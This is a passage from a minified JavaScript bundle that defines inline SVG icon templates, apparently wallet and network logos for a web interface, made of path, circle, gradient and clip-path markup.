      d="M42.8437 8.3264C42.4507 7.70891 41.5493 7.70891 41.1564 8.32641L28.978 27.4638C28.5544 28.1295 29.0326 29.0007 29.8217 29.0007H54.1783C54.9674 29.0007 55.4456 28.1295 55.022 27.4638L42.8437 8.3264Z"
      fill="white"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.3348 11.6456C42.659 11.7608 42.9061 12.1492 43.4005 12.926L50.7332 24.4488C51.2952 25.332 51.5763 25.7737 51.5254 26.1382C51.4915 26.3808 51.3698 26.6026 51.1833 26.7614C50.9031 27 50.3796 27 49.3327 27H34.6673C33.6204 27 33.0969 27 32.8167 26.7614C32.6302 26.6026 32.5085 26.3808 32.4746 26.1382C32.4237 25.7737 32.7048 25.332 33.2669 24.4488L40.5995 12.926C41.0939 12.1492 41.341 11.7608 41.6652 11.6456C41.8818 11.5687 42.1182 11.5687 42.3348 11.6456ZM35.0001 26.999C38.8661 26.999 42.0001 23.865 42.0001 19.999C42.0001 23.865 45.1341 26.999 49.0001 26.999H35.0001Z"
      fill="#FF974C"
    />
    <path
      d="M10.1061 9.35712C9.9973 9.67775 9.99867 10.0388 9.99978 10.3323C9.99989 10.3611 10 10.3893 10 10.4167V25.5833C10 25.6107 9.99989 25.6389 9.99978 25.6677C9.99867 25.9612 9.9973 26.3222 10.1061 26.6429C10.306 27.2317 10.7683 27.694 11.3571 27.8939C11.6777 28.0027 12.0388 28.0013 12.3323 28.0002C12.3611 28.0001 12.3893 28 12.4167 28H19C24.5228 28 29 23.5228 29 18C29 12.4772 24.5228 8 19 8H12.4167C12.3893 8 12.3611 7.99989 12.3323 7.99978C12.0388 7.99867 11.6778 7.9973 11.3571 8.10614C10.7683 8.306 10.306 8.76834 10.1061 9.35712Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="19" cy="18" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
    <circle cx="19" cy="42" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="clip0_7734_50402">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,IDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#1DC956"
      d="M0 25.01c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02.11 15.65.11 24.9.11h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.13 60 15.76 60 25v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-3.45 1.97-8.08 1.97-17.33 1.97H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 49.1 0 44.46 0 35.21v-10.2Z"
    />
    <path
      fill="#2BEE6C"
      d="M16.1 60c-3.82-.18-6.4-.64-8.53-1.86a15 15 0 0 1-5.6-5.6C.55 50.06.16 46.97.04 41.98L4.2 40.6a4 4 0 0 0 2.48-2.39l4.65-12.4a2 2 0 0 1 2.5-1.2l2.53.84a2 2 0 0 0 2.43-1l2.96-5.94a2 2 0 0 1 3.7.32l3.78 12.58a2 2 0 0 0 3.03 1.09l3.34-2.23a2 2 0 0 0 .65-.7l5.3-9.72a2 2 0 0 1 1.42-1.01l4.14-.69a2 2 0 0 1 1.6.44l3.9 3.24a2 2 0 0 0 2.7-.12l4.62-4.63c.08 2.2.08 4.8.08 7.93v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-2.13 1.22-4.7 1.68-8.54 1.86H16.11Z"
    />
    <path
      fill="#fff"
      d="m.07 43.03-.05-2.1 3.85-1.28a3 3 0 0 0 1.86-1.79l4.66-12.4a3 3 0 0 1 3.75-1.8l2.53.84a1 1 0 0 0 1.21-.5l2.97-5.94a3 3 0 0 1 5.56.48l3.77 12.58a1 1 0 0 0 1.51.55l3.34-2.23a1 1 0 0 0 .33-.35l5.3-9.71a3 3 0 0 1 2.14-1.53l4.13-.69a3 3 0 0 1 2.41.66l3.9 3.24a1 1 0 0 0 1.34-.06l5.28-5.28c.05.85.08 1.75.1 2.73L56 22.41a3 3 0 0 1-4.04.19l-3.9-3.25a1 1 0 0 0-.8-.21l-4.13.69a1 1 0 0 0-.72.5l-5.3 9.72a3 3 0 0 1-.97 1.05l-3.34 2.23a3 3 0 0 1-4.53-1.63l-3.78-12.58a1 1 0 0 0-1.85-.16l-2.97 5.94a3 3 0 0 1-3.63 1.5l-2.53-.84a1 1 0 0 0-1.25.6l-4.65 12.4a5 5 0 0 1-3.1 3L.07 43.02Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M49.5 19a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M45 .28v59.66l-2 .1V.19c.7.02 1.37.05 2 .1Z" />
    <path fill="#2BEE6C" d="M47.5 19a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M.5 25.01c0-4.63 0-8.08.24-10.8.25-2.7.73-4.64 1.66-6.28a14.5 14.5 0 0 1 5.42-5.41C9.46 1.58 11.39 1.1 14.1.85A133 133 0 0 1 24.9.61h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.67a14.5 14.5 0 0 1 5.42 5.4c.93 1.65 1.41 3.58 1.66 6.3.24 2.71.24 6.16.24 10.79v10.2c0 4.64 0 8.08-.24 10.8-.25 2.7-.73 4.65-1.66 6.28a14.5 14.5 0 0 1-5.42 5.42c-1.63.93-3.57 1.41-6.28 1.66-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.66a14.5 14.5 0 0 1-5.42-5.42C1.47 50.66 1 48.72.74 46.01A133 133 0 0 1 .5 35.2v-10.2Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg>`,RDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="30" />
    <path
      fill="#E87DE8"
      d="M57.98.01v19.5a4.09 4.09 0 0 0-2.63 2.29L50.7 34.2a2 2 0 0 1-2.5 1.2l-2.53-.84a2 2 0 0 0-2.42 1l-2.97 5.94a2 2 0 0 1-3.7-.32L32.8 28.6a2 2 0 0 0-3.02-1.09l-3.35 2.23a2 2 0 0 0-.64.7l-5.3 9.72a2 2 0 0 1-1.43 1.01l-4.13.69a2 2 0 0 1-1.61-.44l-3.9-3.24a2 2 0 0 0-2.69.12L2.1 42.93.02 43V.01h57.96Z"
    />
    <path
      fill="#fff"
      d="m61.95 16.94.05 2.1-3.85 1.28a3 3 0 0 0-1.86 1.79l-4.65 12.4a3 3 0 0 1-3.76 1.8l-2.53-.84a1 1 0 0 0-1.2.5l-2.98 5.94a3 3 0 0 1-5.55-.48l-3.78-12.58a1 1 0 0 0-1.5-.55l-3.35 2.23a1 1 0 0 0-.32.35l-5.3 9.72a3 3 0 0 1-2.14 1.52l-4.14.69a3 3 0 0 1-2.41-.66l-3.9-3.24a1 1 0 0 0-1.34.06l-5.28 5.28c-.05-.84-.08-1.75-.1-2.73l3.97-3.96a3 3 0 0 1 4.04-.19l3.89 3.25a1 1 0 0 0 .8.21l4.14-.68a1 1 0 0 0 .71-.51l5.3-9.71a3 3 0 0 1 .97-1.06l3.34-2.23a3 3 0 0 1 4.54 1.63l3.77 12.58a1 1 0 0 0 1.86.16l2.96-5.93a3 3 0 0 1 3.64-1.5l2.52.83a1 1 0 0 0 1.25-.6l4.66-12.4a5 5 0 0 1 3.1-2.99l4.43-1.48Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M35.5 27a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M31 0v60h-2V0h2Z" />
    <path fill="#E87DE8" d="M33.5 27a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,PDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#987DE8" rx="30" />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="m15.48 28.37 11.97-19.3a3 3 0 0 1 5.1 0l11.97 19.3a6 6 0 0 1 .9 3.14v.03a6 6 0 0 1-1.16 3.56L33.23 50.2a4 4 0 0 1-6.46 0L15.73 35.1a6 6 0 0 1-1.15-3.54v-.03a6 6 0 0 1 .9-3.16Z"
      clip-rule="evenodd"
    />
    <path
      fill="#643CDD"
      d="M30.84 10.11a1 1 0 0 0-.84-.46V24.5l12.6 5.53a2 2 0 0 0-.28-1.4L30.84 10.11Z"
    />
    <path
      fill="#BDADEB"
      d="M30 9.65a1 1 0 0 0-.85.46L17.66 28.64a2 2 0 0 0-.26 1.39L30 24.5V9.65Z"
    />
    <path
      fill="#643CDD"
      d="M30 50.54a1 1 0 0 0 .8-.4l11.24-15.38c.3-.44-.2-1-.66-.73l-9.89 5.68a3 3 0 0 1-1.5.4v10.43Z"
    />
    <path
      fill="#BDADEB"
      d="m17.97 34.76 11.22 15.37c.2.28.5.41.8.41V40.11a3 3 0 0 1-1.49-.4l-9.88-5.68c-.47-.27-.97.3-.65.73Z"
    />
    <path
      fill="#401AB3"
      d="M42.6 30.03 30 24.5v13.14a3 3 0 0 0 1.5-.4l10.14-5.83a2 2 0 0 0 .95-1.38Z"
    />
    <path
      fill="#7C5AE2"
      d="M30 37.64V24.46l-12.6 5.57a2 2 0 0 0 .97 1.39l10.13 5.82a3 3 0 0 0 1.5.4Z"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,NDe=Mt`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <rect width="64" height="64" rx="30" fill="#1DC956"/>
  <rect x="0.5" y="0.5" width="63" height="63" rx="29.5" stroke="#141414" stroke-opacity="0.1"/>
  <path d="M32.4053 19.8031C35.3901 19.8031 38.0431 20.8349 40.1619 22.8247L45.9656 17.0211C42.4465 13.7416 37.8773 11.7333 32.4053 11.7333C24.4829 11.7333 17.6475 16.2841 14.3127 22.9168L21.056 28.1493C22.6589 23.359 27.136 19.8031 32.4053 19.8031Z" fill="#1DC956" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M32.4053 52.2667C37.8773 52.2667 42.465 50.4611 45.8182 47.3658L39.2407 42.2623C37.4351 43.4783 35.1321 44.2153 32.4053 44.2153C27.136 44.2153 22.6589 40.6594 21.056 35.8691L14.3127 41.1016C17.6475 47.7159 24.4829 52.2667 32.4053 52.2667Z" fill="#2BEE6C"/>
  <path d="M21.056 35.8507L19.5636 36.993L14.3127 41.0832M39.2407 42.2623L45.8182 47.3658C42.465 50.4611 37.8773 52.2667 32.4053 52.2667C24.4829 52.2667 17.6475 47.7159 14.3127 41.1016L21.056 35.8691C22.6589 40.6594 27.136 44.2153 32.4053 44.2153C35.1321 44.2153 37.4351 43.4783 39.2407 42.2623Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M51.8613 32.4606C51.8613 31.0235 51.7323 29.6417 51.4928 28.3151H32.4053V36.1638H43.3124C42.8334 38.688 41.3963 40.8252 39.2407 42.2623L45.8181 47.3658C49.6503 43.8283 51.8613 38.6327 51.8613 32.4606Z" fill="#1FAD7E" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  <path d="M21.056 35.8507C20.6507 34.6347 20.4111 33.345 20.4111 32C20.4111 30.655 20.6507 29.3653 21.056 28.1493L14.3127 22.9169C12.9309 25.6437 12.1387 28.7205 12.1387 32C12.1387 35.2795 12.9309 38.3564 14.3127 41.0831L19.5636 36.993L21.056 35.8507Z" fill="#86F999"/>
  <path d="M21.056 35.8691L14.3127 41.1016M21.056 35.8507C20.6507 34.6347 20.4111 33.345 20.4111 32C20.4111 30.655 20.6507 29.3653 21.056 28.1493L14.3127 22.9169C12.9309 25.6437 12.1387 28.7205 12.1387 32C12.1387 35.2795 12.9309 38.3564 14.3127 41.0831L19.5636 36.993L21.056 35.8507Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
</svg>
`,ODe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="3" />
  <path
    fill="#1FAD7E"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 29.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 19.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#86F999"
    stroke="#fff"
    stroke-width="2"
    d="m46.69 21.06-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-6.32-3.51-.18-.1c-2.33-1.3-3.72-2.06-5.22-2.33a9 9 0 0 0-3.08 0c-1.5.27-2.9 1.04-5.22 2.33l-.17.1-6.33 3.51-.05.03c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45Z"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,kDe=Mt`<svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
  <g clip-path="url(#clip0_241_31636)">
    <path d="M0 26.5595C0 16.6913 0 11.7572 2.1019 8.07217C3.5216 5.58318 5.58366 3.52111 8.07266 2.10141C11.7577 -0.000488281 16.6918 -0.000488281 26.56 -0.000488281H37.44C47.3082 -0.000488281 52.2423 -0.000488281 55.9273 2.10141C58.4163 3.52111 60.4784 5.58318 61.8981 8.07217C64 11.7572 64 16.6913 64 26.5595V37.4395C64 47.3077 64 52.2418 61.8981 55.9269C60.4784 58.4159 58.4163 60.4779 55.9273 61.8976C52.2423 63.9995 47.3082 63.9995 37.44 63.9995H26.56C16.6918 63.9995 11.7577 63.9995 8.07266 61.8976C5.58366 60.4779 3.5216 58.4159 2.1019 55.9269C0 52.2418 0 47.3077 0 37.4395V26.5595Z" fill="#794CFF"/>
    <path d="M0.5 26.5595C0.5 21.6163 0.50047 17.942 0.760736 15.0418C1.02039 12.1485 1.53555 10.0742 2.53621 8.3199C3.91155 5.90869 5.90917 3.91106 8.32039 2.53572C10.0747 1.53506 12.1489 1.01991 15.0423 0.760247C17.9425 0.499981 21.6168 0.499512 26.56 0.499512H37.44C42.3832 0.499512 46.0575 0.499981 48.9577 0.760247C51.8511 1.01991 53.9253 1.53506 55.6796 2.53572C58.0908 3.91106 60.0885 5.90869 61.4638 8.3199C62.4645 10.0742 62.9796 12.1485 63.2393 15.0418C63.4995 17.942 63.5 21.6163 63.5 26.5595V37.4395C63.5 42.3827 63.4995 46.057 63.2393 48.9572C62.9796 51.8506 62.4645 53.9248 61.4638 55.6791C60.0885 58.0903 58.0908 60.088 55.6796 61.4633C53.9253 62.464 51.8511 62.9791 48.9577 63.2388C46.0575 63.499 42.3832 63.4995 37.44 63.4995H26.56C21.6168 63.4995 17.9425 63.499 15.0423 63.2388C12.1489 62.9791 10.0747 62.464 8.32039 61.4633C5.90917 60.088 3.91155 58.0903 2.53621 55.6791C1.53555 53.9248 1.02039 51.8506 0.760736 48.9572C0.50047 46.057 0.5 42.3827 0.5 37.4395V26.5595Z" stroke="#141414" stroke-opacity="0.1"/>
    <path d="M40 39.4595C44.7824 36.693 48 31.5222 48 25.6C48 16.7634 40.8366 9.59998 32 9.59998C23.1634 9.59998 16 16.7634 16 25.6C16 31.5222 19.2176 36.693 24 39.4595V45.8144H40V39.4595Z" fill="#906EF7"/>
    <path d="M24 49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144H24V49.9689Z" fill="#906EF7"/>
    <path d="M24 45.8144V39.4595C19.2176 36.693 16 31.5222 16 25.6C16 16.7634 23.1634 9.59998 32 9.59998C40.8366 9.59998 48 16.7634 48 25.6C48 31.5222 44.7824 36.693 40 39.4595V45.8144M24 45.8144H40M24 45.8144V49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144" stroke="white" stroke-width="2" stroke-linejoin="round"/>
    <path d="M24 49.9689C24 51.8192 24 52.7444 24.3941 53.4353C24.6603 53.902 25.0469 54.2886 25.5136 54.5548C26.2046 54.9489 27.1297 54.9489 28.98 54.9489H35.02C36.8703 54.9489 37.7954 54.9489 38.4864 54.5548C38.9531 54.2886 39.3397 53.902 39.6059 53.4353C40 52.7444 40 51.8192 40 49.9689V45.8144H24V49.9689Z" fill="#643CDD" stroke="white" stroke-width="2" stroke-linejoin="round"/>
    <path d="M29.6735 26.9101V29.1109H34.0753V26.9101C34.0753 25.6945 35.0607 24.7092 36.2762 24.7092C37.4917 24.7092 38.4771 25.6945 38.4771 26.9101C38.4771 28.1256 37.4917 29.1109 36.2762 29.1109H34.0753H29.6735H27.4726C26.2571 29.1109 25.2717 28.1256 25.2717 26.9101C25.2717 25.6945 26.2571 24.7092 27.4726 24.7092C28.6881 24.7092 29.6735 25.6945 29.6735 26.9101Z" fill="#906EF7"/>
    <path d="M29.6735 45.3183V26.9101C29.6735 25.6945 28.6881 24.7092 27.4726 24.7092V24.7092C26.2571 24.7092 25.2717 25.6945 25.2717 26.9101V26.9101C25.2717 28.1256 26.2571 29.1109 27.4726 29.1109H36.2762C37.4917 29.1109 38.4771 28.1256 38.4771 26.9101V26.9101C38.4771 25.6945 37.4917 24.7092 36.2762 24.7092V24.7092C35.0607 24.7092 34.0753 25.6945 34.0753 26.9101V45.3183" stroke="white" stroke-width="2" stroke-linejoin="round"/>
  </g>
  <defs>
    <clipPath id="clip0_241_31636">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
`,DDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#C653C6" rx="3" />
  <path
    fill="#fff"
    d="M20.03 15.22C20 15.6 20 16.07 20 17v2.8c0 1.14 0 1.7-.2 2.12-.15.31-.3.5-.58.71-.37.28-1.06.42-2.43.7-.59.12-1.11.29-1.6.51a9 9 0 0 0-4.35 4.36C10 30 10 32.34 10 37c0 4.66 0 7 .84 8.8a9 9 0 0 0 4.36 4.36C17 51 19.34 51 24 51h12c4.66 0 7 0 8.8-.84a9 9 0 0 0 4.36-4.36C50 44 50 41.66 50 37c0-4.66 0-7-.84-8.8a9 9 0 0 0-4.36-4.36c-.48-.22-1-.39-1.6-.5-1.36-.29-2.05-.43-2.42-.7-.27-.22-.43-.4-.58-.72-.2-.42-.2-.98-.2-2.11V17c0-.93 0-1.4-.03-1.78a9 9 0 0 0-8.19-8.19C31.4 7 30.93 7 30 7s-1.4 0-1.78.03a9 9 0 0 0-8.19 8.19Z"
  />
  <path
    fill="#E87DE8"
    d="M22 17c0-.93 0-1.4.04-1.78a7 7 0 0 1 6.18-6.18C28.6 9 29.07 9 30 9s1.4 0 1.78.04a7 7 0 0 1 6.18 6.18c.04.39.04.85.04 1.78v4.5a1.5 1.5 0 0 1-3 0V17c0-.93 0-1.4-.08-1.78a4 4 0 0 0-3.14-3.14C31.39 12 30.93 12 30 12s-1.4 0-1.78.08a4 4 0 0 0-3.14 3.14c-.08.39-.08.85-.08 1.78v4.5a1.5 1.5 0 0 1-3 0V17Z"
  />
  <path
    fill="#E87DE8"
    fill-rule="evenodd"
    d="M12 36.62c0-4.32 0-6.48.92-8.09a7 7 0 0 1 2.61-2.61C17.14 25 19.3 25 23.62 25h6.86c.46 0 .7 0 .9.02 2.73.22 4.37 2.43 4.62 4.98.27-2.7 2.11-5 5.02-5A6.98 6.98 0 0 1 48 31.98v5.4c0 4.32 0 6.48-.92 8.09a7 7 0 0 1-2.61 2.61c-1.61.92-3.77.92-8.09.92h-5.86c-.46 0-.7 0-.9-.02-2.73-.22-4.37-2.43-4.62-4.98-.26 2.58-1.94 4.82-4.71 4.99l-.7.01c-.55 0-.82 0-1.05-.02a7 7 0 0 1-6.52-6.52c-.02-.23-.02-.5-.02-1.05v-4.79Zm21.24-.27a4 4 0 1 0-6.48 0 31.28 31.28 0 0 1 1.57 2.23c.17.4.17.81.17 1.24V42.5a1.5 1.5 0 0 0 3 0V39.82c0-.43 0-.85.17-1.24.09-.2.58-.87 1.57-2.23Z"
    clip-rule="evenodd"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,BDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#EB8B47"
      d="M0 24.9c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02 0 15.65 0 24.9 0h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.02 60 15.65 60 24.9v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6C48.98 60 44.35 60 35.1 60H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 48.98 0 44.35 0 35.1V24.9Z"
    />
    <path
      stroke="#062B2B"
      stroke-opacity=".1"
      d="M.5 24.9c0-4.64 0-8.08.24-10.8.25-2.7.73-4.65 1.66-6.28A14.5 14.5 0 0 1 7.82 2.4C9.46 1.47 11.39 1 14.1.74A133 133 0 0 1 24.9.5h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.66a14.5 14.5 0 0 1 5.42 5.42c.93 1.63 1.41 3.57 1.66 6.28.24 2.72.24 6.16.24 10.8v10.2c0 4.63 0 8.08-.24 10.8-.25 2.7-.73 4.64-1.66 6.28a14.5 14.5 0 0 1-5.42 5.41c-1.63.94-3.57 1.42-6.28 1.67-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.67a14.5 14.5 0 0 1-5.42-5.4C1.47 50.53 1 48.6.74 45.88A133 133 0 0 1 .5 35.1V24.9Z"
    />
    <path
      fill="#FF974C"
      stroke="#fff"
      stroke-width="2"
      d="M39.2 29.2a13 13 0 1 0-18.4 0l1.3 1.28a12.82 12.82 0 0 1 2.1 2.39 6 6 0 0 1 .6 1.47c.2.76.2 1.56.2 3.17v11.24c0 1.08 0 1.61.13 2.12a4 4 0 0 0 .41.98c.26.45.64.83 1.4 1.6l.3.29c.65.65.98.98 1.36 1.09.26.07.54.07.8 0 .38-.11.7-.44 1.36-1.1l3.48-3.47c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.47-.48c-.65-.65-.98-.98-1.09-1.36a1.5 1.5 0 0 1 0-.8c.1-.38.44-.7 1.1-1.36l.47-.48c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.48-.5c-.65-.64-.98-.97-1.08-1.35a1.5 1.5 0 0 1 0-.79c.1-.38.42-.7 1.06-1.36l5.46-5.55Z"
    />
    <circle cx="30" cy="17" r="4" fill="#EB8B47" stroke="#fff" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg> `,jDe=Mt`<svg width="40" height="42" viewBox="0 0 40 42" fill="none">
<path opacity="0.7" d="M19.9526 41.9076L7.3877 34.655V26.1226L19.9526 33.3751V41.9076Z" fill="url(#paint0_linear_2113_32117)"/>
<path opacity="0.7" d="M19.9521 41.9076L32.5171 34.655V26.1226L19.9521 33.3751V41.9076Z" fill="url(#paint1_linear_2113_32117)"/>
<path opacity="0.7" d="M39.9095 7.34521V21.8562L32.5166 26.1225V11.6114L39.9095 7.34521Z" fill="url(#paint2_linear_2113_32117)"/>
<path d="M39.9099 7.34536L27.345 0.0927734L19.9521 4.359L32.5171 11.6116L39.9099 7.34536Z" fill="url(#paint3_linear_2113_32117)"/>
<path d="M0 7.34536L12.5649 0.0927734L19.9519 4.359L7.387 11.6116L0 7.34536Z" fill="#F969D3"/>
<path opacity="0.7" d="M0 7.34521V21.8562L7.387 26.1225V11.6114L0 7.34521Z" fill="url(#paint4_linear_2113_32117)"/>
<defs>
<linearGradient id="paint0_linear_2113_32117" x1="18.6099" y1="41.8335" x2="7.73529" y2="8.31842" gradientUnits="userSpaceOnUse">
<stop stop-color="#E98ADA"/>
<stop offset="1" stop-color="#7E4DBD"/>
</linearGradient>
<linearGradient id="paint1_linear_2113_32117" x1="26.2346" y1="26.1226" x2="26.2346" y2="41.9076" gradientUnits="userSpaceOnUse">
<stop stop-color="#719DED"/>
<stop offset="1" stop-color="#2545BE"/>
</linearGradient>
<linearGradient id="paint2_linear_2113_32117" x1="36.213" y1="7.34521" x2="36.213" y2="26.1225" gradientUnits="userSpaceOnUse">
<stop stop-color="#93EBFF"/>
<stop offset="1" stop-color="#197DDB"/>
</linearGradient>
<linearGradient id="paint3_linear_2113_32117" x1="29.931" y1="0.0927734" x2="38.2156" y2="14.8448" gradientUnits="userSpaceOnUse">
<stop stop-color="#F969D3"/>
<stop offset="1" stop-color="#4F51C0"/>
</linearGradient>
<linearGradient id="paint4_linear_2113_32117" x1="18.1251" y1="44.2539" x2="-7.06792" y2="15.2763" gradientUnits="userSpaceOnUse">
<stop stop-color="#E98ADA"/>
<stop offset="1" stop-color="#7E4DBD"/>
</linearGradient>
</defs>
</svg>`,MDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#00ACE6" rx="30" />
    <circle cx="64" cy="39" r="50" fill="#1AC6FF" stroke="#fff" stroke-width="2" />
    <circle cx="78" cy="30" r="50" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="72" cy="15" r="35" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-17" r="45" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-5" r="50" stroke="#fff" stroke-width="2" />
    <circle cx="30" cy="45" r="4" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="39.5" cy="27.5" r="4" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="16" cy="24" r="4" fill="#19C6FF" stroke="#fff" stroke-width="2" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg>`,UDe=Mt`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="3" />
    <path
      fill="#E87DE8"
      stroke="#fff"
      stroke-width="2"
